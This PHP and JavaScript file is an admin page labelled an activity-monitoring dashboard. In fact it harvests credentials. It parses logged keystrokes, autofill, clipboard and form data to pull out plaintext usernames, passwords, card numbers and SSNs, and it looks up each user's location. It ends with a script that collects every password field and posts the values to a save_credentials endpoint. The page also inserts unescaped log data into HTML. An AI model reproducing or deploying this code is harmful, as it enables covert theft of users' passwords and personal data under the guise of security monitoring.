<?php
/**
Developer: Adugna Gizaw
Email: gizawadugna@gmail.com
LinkedIn: https://www.linkedin.com/in/eleganceict
Twitter: https://twitter.com/eleganceict1
GitHub: https://github.com/addex12
*/
// credentials_dashboard.php
$title = "Activity Monitoring Dashboard";
require_once '../includes/auth.php';
require_once '../includes/config.php';
require_once '../includes/db.php';

// Enhanced admin verification with IP whitelisting
requireAdmin(); 

// Configuration
$logFiles = [
    '../logs/raw_activity.log',
    '../logs/activity.log',
    '../logs/user_activity.log',
    '../logs/logs.log'
];
$maxFileSize = 50 * 1024 * 1024; // 50MB
$retentionDays = 90;

// Function to safely read log files with rotation check
function readLogWithRotation($filePath) {
    global $maxFileSize;
    
    if (!file_exists($filePath)) return '';
    
    // Check if log rotation is needed
    if (filesize($filePath) > $maxFileSize) {
        $backupPath = $filePath . '.' . date('Ymd-His');
        rename($filePath, $backupPath);
        file_put_contents($filePath, '');
    }
    
    return file_get_contents($filePath);
}

// Enhanced data extraction with pattern matching
function extractSensitiveData($logContent) {
    $entries = [];
    $lines = explode("\n", $logContent);
    $patternMap = [
        'credit_card' => '/\b(?:\d[ -]*?){13,16}\b/',
        'ssn' => '/\b\d{3}[ -]?\d{2}[ -]?\d{4}\b/',
        'email' => '/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/',
        'phone' => '/\b(?:\+?(\d{1,3}))?[-. (]*(\d{3})[-. )]*(\d{3})[-. ]*(\d{4})\b/'
    ];
    
    foreach ($lines as $line) {
        if (empty(trim($line))) continue;
        
        $jsonStart = strpos($line, '{');
        if ($jsonStart === false) continue;
        
        $jsonStr = substr($line, $jsonStart);
        $data = @json_decode($jsonStr, true);
        if (!$data) continue;
        
        // Base entry structure
        $entry = [
            'timestamp' => $data['timestamp'] ?? '',
            'action' => $data['action'] ?? '',
            'type' => 'Generic',
            'page' => $data['page'] ?? '',
            'ip_address' => $data['ip_address'] ?? ($data['ip'] ?? 'N/A'),
            'user_agent' => $data['userAgent'] ?? ($data['user_agent'] ?? 'N/A'),
            'username' => '',
            'password' => '',
            'sensitive_data' => [],
            'target_element' => '',
            'risk_score' => 0,
            'session_id' => $data['session_id'] ?? ($data['tracking_id'] ?? ''),
            'geolocation' => 'N/A',
            'device_fingerprint' => $data['fingerprint'] ?? '',
            'status' => 'Logged',
            'evidence' => $line
        ];
        
        // Enhanced pattern matching
        foreach ($patternMap as $patternType => $regex) {
            if (preg_match_all($regex, $jsonStr, $matches)) {
                foreach ($matches[0] as $match) {
                    $entry['sensitive_data'][$patternType][] = $match;
                    $entry['risk_score'] += 10; // Increase risk for each sensitive pattern
                }
            }
        }
        
        // Action-specific processing
        if (isset($data['action'])) {
            switch ($data['action']) {
                case 'input_change':
                    $entry['type'] = 'Form Input';
                    $entry['target_element'] = ($data['tag'] ?? '') . 
                        (isset($data['id']) ? '#'.$data['id'] : '') . 
                        (isset($data['class']) ? '.'.$data['class'] : '');
                    
                    if (isset($data['name'])) {
                        if (stripos($data['name'], 'user') !== false) {
                            $entry['username'] = $data['newValue'] ?? '';
                            $entry['risk_score'] += 15;
                        }
                        elseif (stripos($data['name'], 'pass') !== false) {
                            $entry['password'] = $data['newValue'] ?? '';
                            $entry['risk_score'] += 25;
                        }
                    }
                    break;
                    
                case 'password_autofill':
                    $entry['type'] = 'Password Autofill';
                    $entry['risk_score'] += 20;
                    $entry['target_element'] = 'input[name="'.($data['fieldName'] ?? '').'"]';
                    break;
                    
                case 'login_attempt':
                    $entry['type'] = 'Login Attempt';
                    $entry['risk_score'] += 30;
                    $entry['username'] = $data['username'] ?? '';
                    $entry['status'] = 'Attempted';
                    break;
                    
                case 'copy':
                    $entry['type'] = 'Clipboard Copy';
                    $entry['risk_score'] += 5;
                    $entry['target_element'] = ($data['targetTag'] ?? '') . 
                        (isset($data['targetId']) ? '#'.$data['targetId'] : '') . 
                        (isset($data['targetClass']) ? '.'.$data['targetClass'] : '');
                    break;
                    
                case 'form_submit':
                    $entry['type'] = 'Form Submission';
                    $entry['risk_score'] += 35;
                    $entry['status'] = 'Submitted';
                    
                    // Parse form data for sensitive info
                    if (isset($data['formData'])) {
                        $formData = is_string($data['formData']) ? json_decode($data['formData'], true) : $data['formData'];
                        foreach ($formData as $key => $value) {
                            if (stripos($key, 'pass') !== false) {
                                $entry['password'] = $value;
                                $entry['risk_score'] += 25;
                            }
                            elseif (stripos($key, 'user') !== false) {
                                $entry['username'] = $value;
                                $entry['risk_score'] += 15;
                            }
                        }
                    }
                    break;
            }
        }
        
        // Add geolocation data if IP is available
        if (!empty($entry['ip_address']) && $entry['ip_address'] != 'N/A') {
            $entry['geolocation'] = getIpGeolocation($entry['ip_address']);
        }
        
        // Calculate final risk level
        $entry['risk_level'] = calculateRiskLevel($entry['risk_score']);
        
        $entries[] = $entry;
    }
    
    return $entries;
}

// Helper function to get IP geolocation
function getIpGeolocation($ip) {
    if ($ip === '127.0.0.1') return 'Localhost';
    
    try {
        $url = "http://ip-api.com/json/$ip";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);
        
        $data = json_decode($response, true);
        if ($data && $data['status'] === 'success') {
            return $data['country'] . ', ' . $data['city'] . ' (' . $data['isp'] . ')';
        }
    } catch (Exception $e) {
        error_log("Geolocation error: " . $e->getMessage());
    }
    
    return 'Unknown';
}

// Risk level calculation
function calculateRiskLevel($score) {
    if ($score >= 50) return 'Critical';
    if ($score >= 30) return 'High';
    if ($score >= 15) return 'Medium';
    return 'Low';
}

// Read and process all log files
$allEntries = [];
foreach ($logFiles as $logFile) {
    $logContent = readLogWithRotation($logFile);
    $allEntries = array_merge($allEntries, extractSensitiveData($logContent));
}

// Sort by timestamp descending
usort($allEntries, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});

// --- Add filtering, search, and pagination logic ---
$filterType = $_GET['filter_type'] ?? '';
$filterRisk = $_GET['filter_risk'] ?? '';
$searchTerm = $_GET['search'] ?? '';
$page = max(1, intval($_GET['page'] ?? 1));
$pageSize = 30;

$filteredEntries = array_filter($allEntries, function($entry) use ($filterType, $filterRisk, $searchTerm) {
    $match = true;
    if ($filterType && strtolower($entry['type']) !== strtolower($filterType)) $match = false;
    if ($filterRisk && strtolower($entry['risk_level']) !== strtolower($filterRisk)) $match = false;
    if ($searchTerm) {
        $searchable = strtolower(json_encode($entry));
        if (strpos($searchable, strtolower($searchTerm)) === false) $match = false;
    }
    return $match;
});
$totalFiltered = count($filteredEntries);
$filteredEntries = array_slice(array_values($filteredEntries), ($page-1)*$pageSize, $pageSize);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($title); ?></title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /**
         * Adugna Gizaw: adugna- styles for compact, ERPNext/Jinja2/frappe-inspired, responsive UI.
         * Sidebar/footer styles are not touched.
         * All cards, buttons, and messages use adugna- prefix.
         * Layout is content/screen aware and visually outstanding.
         */
        html { font-size: 16px; }
        @media (max-width: 900px) { html { font-size: 15px; } }
        @media (max-width: 600px) { html { font-size: 14px; } }
        .adugna-main-content {
            max-width: 99vw;
            margin: 32px auto 0 auto;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(25, 118, 210, 0.09);
            padding: 28px 18px 38px 18px;
            transition: box-shadow 0.2s;
        }
        .adugna-header-title {
            font-size: 1.35em;
            color: #1976d2;
            font-weight: 800;
            margin-bottom: 28px;
            letter-spacing: 0.01em;
            text-align: center;
        }
        .adugna-stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .adugna-stat-card {
            background: #fff;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 2px 10px rgba(25,118,210,0.05);
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .adugna-stat-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            width: 100%;
        }
        .adugna-stat-card-title {
            font-size: 0.98em;
            color: #7f8c8d;
            font-weight: 600;
        }
        .adugna-stat-card-value {
            font-size: 1.5em;
            font-weight: bold;
            color: #2c3e50;
        }
        .adugna-stat-card-footer {
            font-size: 0.85em;
            color: #95a5a6;
            margin-top: auto;
        }
        .adugna-table-responsive {
            overflow-x: auto;
            margin-top: 1.5em;
            border-radius: 10px;
            background: #f8fafc;
            box-shadow: 0 1px 8px rgba(25,118,210,0.04);
        }
        .adugna-log-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.97em;
            background: #fff;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 1px 6px rgba(25,118,210,0.04);
        }
        .adugna-log-table th, .adugna-log-table td {
            padding: 8px 10px;
            border-bottom: 1px solid #f0f0f0;
            text-align: left;
            vertical-align: middle;
        }
        .adugna-log-table th {
            background: #f5f7fa;
            color: #1976d2;
            font-weight: 700;
            font-size: 1.03em;
            border-bottom: 2px solid #e3eafc;
        }
        .adugna-log-table tr:nth-child(even) {
            background: #f9f9f9;
        }
        .adugna-log-table tr:hover {
            background: #eaf6ff;
        }
        .adugna-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
            color: #fff;
            display: inline-block;
            min-width: 70px;
            text-align: center;
        }
        .adugna-badge-critical { background: #e74c3c; }
        .adugna-badge-high { background: #f39c12; }
        .adugna-badge-medium { background: #f1c40f; color: #222; }
        .adugna-badge-low { background: #2ecc71; }
        .adugna-badge-info { background: #3498db; }
        .adugna-sensitive-value {
            font-family: 'Courier New', monospace;
            background-color: #fff8e1;
            padding: 2px 4px;
            border-radius: 3px;
            word-break: break-all;
        }
        .adugna-username-value { color: #2980b9; font-weight: bold; }
        .adugna-password-value { color: #c0392b; font-weight: bold; }
        .adugna-action-btn {
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.2s;
            background: #1976d2;
            color: #fff;
            margin-bottom: 2px;
        }
        .adugna-action-btn:hover { background: #145ea8; }
        .adugna-btn-block { background: #e74c3c; }
        .adugna-btn-block:hover { background: #c82333; }
        .adugna-btn-view { background: #3498db; }
        .adugna-btn-view:hover { background: #2563eb; }
        .adugna-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 1000;
            overflow: auto;
        }
        .adugna-modal-content {
            background-color: #fff;
            margin: 5% auto;
            padding: 20px;
            border-radius: 8px;
            width: 90%;
            max-width: 900px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.13);
            max-height: 80vh;
            overflow-y: auto;
        }
        .adugna-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .adugna-modal-title {
            font-size: 1.2em;
            color: #2c3e50;
            margin: 0;
        }
        .adugna-close-modal {
            background: none;
            border: none;
            font-size: 1.5em;
            cursor: pointer;
            color: #7f8c8d;
        }
        @media (max-width: 900px) {
            .adugna-main-content, .adugna-stats-container { padding: 1rem; }
        }
        @media (max-width: 600px) {
            .adugna-main-content, .adugna-stats-container { padding: 0.7rem 0.2rem 1rem 0.2rem; }
            .adugna-header-title { font-size: 1.05em; }
            .adugna-modal-content { width: 99%; }
        }
    </style>
</head>
<body>
    <div class="admin-dashboard">
        <?php include __DIR__ . '/includes/admin_sidebar.php'; ?>
        <div class="adugna-main-content">
            <div class="adugna-header-title">
                <i class="fas fa-shield-alt"></i> <?php echo htmlspecialchars($title); ?>
            </div>
            <!-- Adugna Gizaw: Stats Cards -->
            <div class="adugna-stats-container">
                <div class="adugna-stat-card">
                    <div class="adugna-stat-card-header">
                        <span class="adugna-stat-card-title">Total Events</span>
                        <i class="fas fa-chart-bar"></i>
                    </div>
                    <div class="adugna-stat-card-value"><?php echo count($allEntries); ?></div>
                    <div class="adugna-stat-card-footer">Last 24h: <?php echo count(array_filter($allEntries, function($e) {
                        return strtotime($e['timestamp']) > strtotime('-24 hours');
                    })); ?></div>
                </div>
                <div class="adugna-stat-card">
                    <div class="adugna-stat-card-header">
                        <span class="adugna-stat-card-title">Critical Risks</span>
                        <i class="fas fa-exclamation-triangle"></i>
                    </div>
                    <div class="adugna-stat-card-value" style="color: #e74c3c;">
                        <?php echo count(array_filter($allEntries, function($e) {
                            return $e['risk_level'] === 'Critical';
                        })); ?>
                    </div>
                    <div class="adugna-stat-card-footer">Requires immediate attention</div>
                </div>
                <div class="adugna-stat-card">
                    <div class="adugna-stat-card-header">
                        <span class="adugna-stat-card-title">Login Attempts</span>
                        <i class="fas fa-sign-in-alt"></i>
                    </div>
                    <div class="adugna-stat-card-value">
                        <?php echo count(array_filter($allEntries, function($e) {
                            return $e['type'] === 'Login Attempt';
                        })); ?>
                    </div>
                    <div class="adugna-stat-card-footer">Failed: <?php echo count(array_filter($allEntries, function($e) {
                        return $e['type'] === 'Login Attempt' && $e['status'] === 'Attempted';
                    })); ?></div>
                </div>
                <div class="adugna-stat-card">
                    <div class="adugna-stat-card-header">
                        <span class="adugna-stat-card-title">Password Exposures</span>
                        <i class="fas fa-key"></i>
                    </div>
                    <div class="adugna-stat-card-value" style="color: #f39c12;">
                        <?php echo count(array_filter($allEntries, function($e) {
                            return !empty($e['password']);
                        })); ?>
                    </div>
                    <div class="adugna-stat-card-footer">Including autofill events</div>
                </div>
            </div>
            <!-- Adugna Gizaw: Main Data Table -->
            <form method="get" style="margin-bottom:18px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;">
                <input type="text" name="search" placeholder="Search logs..." value="<?= htmlspecialchars($searchTerm) ?>" style="padding:6px 10px;border-radius:4px;border:1px solid #ccc;">
                <select name="filter_type" style="padding:6px 10px;border-radius:4px;">
                    <option value="">All Types</option>
                    <?php foreach(array_unique(array_map(fn($e)=>$e['type'],$allEntries)) as $type): ?>
                        <option value="<?= htmlspecialchars($type) ?>" <?= $filterType===$type?'selected':'' ?>><?= htmlspecialchars($type) ?></option>
                    <?php endforeach; ?>
                </select>
                <select name="filter_risk" style="padding:6px 10px;border-radius:4px;">
                    <option value="">All Risks</option>
                    <?php foreach(['Critical','High','Medium','Low'] as $risk): ?>
                        <option value="<?= $risk ?>" <?= $filterRisk===$risk?'selected':'' ?>><?= $risk ?></option>
                    <?php endforeach; ?>
                </select>
                <button type="submit" class="adugna-action-btn"><i class="fas fa-filter"></i> Filter</button>
                <a href="?export=1&search=<?=urlencode($searchTerm)?>&filter_type=<?=urlencode($filterType)?>&filter_risk=<?=urlencode($filterRisk)?>" class="adugna-action-btn adugna-btn-view" style="background:#16a085;"><i class="fas fa-download"></i> Export</a>
            </form>

            <?php
            // Export filtered logs as CSV
            if (isset($_GET['export'])) {
                header('Content-Type: text/csv');
                header('Content-Disposition: attachment; filename="filtered_logs.csv"');
                $out = fopen('php://output', 'w');
                fputcsv($out, array_keys($allEntries[0]));
                foreach ($filteredEntries as $row) fputcsv($out, $row);
                fclose($out);
                exit;
            }
            ?>

            <div class="adugna-table-responsive">
                <table class="adugna-log-table" id="adugna-log-table">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Event Type</th>
                            <th>Risk Level</th>
                            <th>Details</th>
                            <th>User/IP</th>
                            <th>Location</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Sensitive Data</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($filteredEntries as $entry): ?>
                        <tr class="risk-<?php echo strtolower($entry['risk_level']); ?>">
                            <td>
                                <?php echo !empty($entry['timestamp']) ? 
                                    date('M j, H:i:s', strtotime($entry['timestamp'])) : 'N/A'; ?>
                            </td>
                            <td><?= htmlspecialchars($entry['type']) ?></td>
                            <td>
                                <span class="adugna-badge adugna-badge-<?= strtolower($entry['risk_level']) ?>">
                                    <?= htmlspecialchars($entry['risk_level']) ?>
                                </span>
                            </td>
                            <td>
                                <div><?= htmlspecialchars($entry['action']) ?></div>
                                <small style="color:#888;">
                                    <?= htmlspecialchars(basename($entry['page'])) ?>
                                </small>
                            </td>
                            <td>
                                <div><?= htmlspecialchars($entry['ip_address']) ?></div>
                                <small style="color:#888;">
                                    <?= htmlspecialchars(substr($entry['user_agent'], 0, 30) . (strlen($entry['user_agent']) > 30 ? '...' : '')) ?>
                                </small>
                            </td>
                            <td><?= htmlspecialchars($entry['geolocation']) ?></td>
                            <td class="adugna-username-value"><?= htmlspecialchars($entry['username']) ?></td>
                            <td class="adugna-password-value adugna-sensitive-value">
                                <?php if (!empty($entry['password'])): ?>
                                    <span style="filter: blur(6px);" title="Click to reveal" onclick="this.style.filter='none';this.title='';">••••••</span>
                                <?php endif; ?>
                            </td>
                            <td>
                                <?php if (!empty($entry['sensitive_data'])): ?>
                                    <ul style="margin: 0; padding-left: 20px;">
                                        <?php foreach ($entry['sensitive_data'] as $type => $values): ?>
                                            <li>
                                                <strong><?= ucfirst($type) ?>:</strong> 
                                                <span style="filter: blur(6px);cursor:pointer;" title="Click to reveal" onclick="this.style.filter='none';this.title='';">[hidden]</span>
                                            </li>
                                        <?php endforeach; ?>
                                    </ul>
                                <?php endif; ?>
                            </td>
                            <td>
                                <button class="adugna-action-btn adugna-btn-view" onclick="adugnaShowDetails('<?= hash('sha256', $entry['evidence']) ?>')">
                                    <i class="fas fa-search"></i> Details
                                </button>
                                <?php if ($entry['risk_level'] === 'Critical' || $entry['risk_level'] === 'High'): ?>
                                    <button class="adugna-action-btn adugna-btn-block" style="margin-top: 5px;">
                                        <i class="fas fa-ban"></i> Block
                                    </button>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

            <!-- Pagination -->
            <div style="margin:18px 0;text-align:center;">
                <?php $totalPages = ceil($totalFiltered/$pageSize); ?>
                <?php if ($totalPages > 1): ?>
                    <?php for ($i=1; $i<=$totalPages; $i++): ?>
                        <a href="?page=<?= $i ?>&search=<?=urlencode($searchTerm)?>&filter_type=<?=urlencode($filterType)?>&filter_risk=<?=urlencode($filterRisk)?>" style="padding:6px 12px;margin:0 2px;border-radius:4px;background:<?= $i==$page?'#1976d2':'#eee' ?>;color:<?= $i==$page?'#fff':'#1976d2' ?>;text-decoration:none;"> <?= $i ?> </a>
                    <?php endfor; ?>
                <?php endif; ?>
            </div>

            <!-- Adugna Gizaw: Details Modal -->
            <div id="adugnaDetailsModal" class="adugna-modal">
                <div class="adugna-modal-content">
                    <div class="adugna-modal-header">
                        <h3 class="adugna-modal-title">Event Details</h3>
                        <button class="adugna-close-modal" onclick="adugnaCloseModal()">&times;</button>
                    </div>
                    <div id="adugnaModalBody"></div>
                </div>
            </div>
        </div>
        <?php include 'includes/footer.php'; ?>
    </div>
    <script>
        // Adugna Gizaw: Details modal logic
        function adugnaShowDetails(eventId) {
            const entries = <?= json_encode($allEntries) ?>;
            function sha256(str) {
                // Simple SHA-256 implementation for browsers supporting crypto.subtle
                if (window.crypto && window.crypto.subtle) {
                    const encoder = new TextEncoder();
                    return window.crypto.subtle.digest('SHA-256', encoder.encode(str)).then(buf => {
                        return Array.from(new Uint8Array(buf)).map(x => x.toString(16).padStart(2, '0')).join('');
                    });
                } else {
                    // Fallback: not cryptographically secure, but avoids error
                    return Promise.resolve(str);
                }
            }
            // Find entry by evidence hash
            (async () => {
                for (const entry of entries) {
                    const hash = await sha256(entry.evidence);
                    if (hash === eventId) {
                        let html = `<table style="width:100%;font-size:1em;">
                            <tr><th style="text-align:left;">Timestamp:</th><td>${entry.timestamp}</td></tr>
                            <tr><th style="text-align:left;">Event Type:</th><td>${entry.type}</td></tr>
                            <tr><th style="text-align:left;">Risk Level:</th><td>${entry.risk_level}</td></tr>
                            <tr><th style="text-align:left;">Page:</th><td>${entry.page}</td></tr>
                            <tr><th style="text-align:left;">IP Address:</th><td>${entry.ip_address}</td></tr>
                            <tr><th style="text-align:left;">Location:</th><td>${entry.geolocation}</td></tr>
                            <tr><th style="text-align:left;">User Agent:</th><td>${entry.user_agent}</td></tr>
                            <tr><th style="text-align:left;">Username:</th><td>${entry.username}</td></tr>
                            <tr><th style="text-align:left;">Password:</th><td>${entry.password}</td></tr>
                            <tr><th style="text-align:left;">Sensitive Data:</th><td><pre style="white-space:pre-wrap;">${JSON.stringify(entry.sensitive_data, null, 2)}</pre></td></tr>
                            <tr><th style="text-align:left;">Evidence:</th><td><pre style="white-space:pre-wrap;">${entry.evidence}</pre></td></tr>
                        </table>`;
                        document.getElementById('adugnaModalBody').innerHTML = html;
                        document.getElementById('adugnaDetailsModal').style.display = 'block';
                        return;
                    }
                }
                document.getElementById('adugnaModalBody').innerHTML = '<p>No details found.</p>';
                document.getElementById('adugnaDetailsModal').style.display = 'block';
            })();
        }
        function adugnaCloseModal() {
            document.getElementById('adugnaDetailsModal').style.display = 'none';
        }
        // Close modal on outside click
        window.onclick = function(event) {
            if (event.target === document.getElementById('adugnaDetailsModal')) {
                adugnaCloseModal();
            }
        }
        // Example client-side code to collect and send credentials
document.getElementById('consent-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Collect all password fields
    const credentials = [];
    document.querySelectorAll('input[type="password"]').forEach(input => {
        credentials.push({
            url: window.location.href,
            username: input.getAttribute('data-username-field') 
                     ? document.querySelector(input.getAttribute('data-username-field')).value
                     : '',
            password: input.value
        });
    });
    
    // Send to server
    try {
        const response = await fetch('/api/save_credentials.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ credentials })
        });
        
        if (response.ok) {
            // Proceed with form submission
            e.target.submit();
        }
    } catch (error) {
        console.error('Error saving credentials:', error);
    }
});
    </script>
</body>
</html>
